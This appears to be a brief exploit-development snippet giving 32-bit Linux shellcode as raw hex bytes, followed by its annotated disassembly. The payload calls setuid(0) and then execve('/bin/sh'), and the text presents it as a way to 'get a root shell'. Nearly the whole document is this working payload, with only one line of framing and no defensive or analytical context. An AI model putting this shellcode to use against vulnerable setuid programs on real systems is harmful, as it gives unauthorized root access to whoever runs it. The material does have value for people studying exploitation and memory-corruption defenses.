
With the following machine code we can get a root shell:

31 C0 31 DB B0 17 CD 80 EB 1F 5E 89 76 08 31 C0
88 46 07 89 46 0C B0 0B 89 F3 8D 4E 08 8D 56 0C
CD 80 31 DB 89 D8 40 CD 80 E8 DC FF FF FF 2F 62
69 6E 2F 73 68

And its asm code:

seg000:00000000 loc_0:
seg000:00000000         xor     eax, eax
seg000:00000002         xor     ebx, ebx
seg000:00000004         mov     al, 17h         ; 23 - LINUX - sys_setuid 
seg000:00000006         int     80h             ; system_call
seg000:00000008         jmp     short loc_29
seg000:0000000A sub_A:
seg000:0000000A         pop     esi
seg000:0000000B         mov     [esi+8], esi
seg000:0000000E         xor     eax, eax
seg000:00000010         mov     [esi+7], al
seg000:00000013         mov     [esi+0Ch], eax
seg000:00000016         mov     al, 0Bh         ; 11 - LINUX - sys_execve
seg000:00000018         mov     ebx, esi        ; file
seg000:0000001A         lea     ecx, [esi+8]    ; argv
seg000:0000001D         lea     edx, [esi+0Ch]  ; envp
seg000:00000020         int     80h             ; system_call
seg000:00000022         xor     ebx, ebx
seg000:00000024         mov     eax, ebx
seg000:00000026         inc     eax             ; 1 - LINUX - sys_exit
seg000:00000027         int     80h             ; system_call
seg000:00000029 loc_29:
seg000:00000029         call    sub_A
seg000:0000002E         db      2Fh             ; /
seg000:0000002F         db      62h             ; b
seg000:00000030         db      69h             ; i
seg000:00000031         db      6Eh             ; n
seg000:00000032         db      2Fh             ; /
seg000:00000033         db      73h             ; s
seg000:00000034         db      68h             ; h
seg000:00000035         db      0
seg000:00000036         db      0

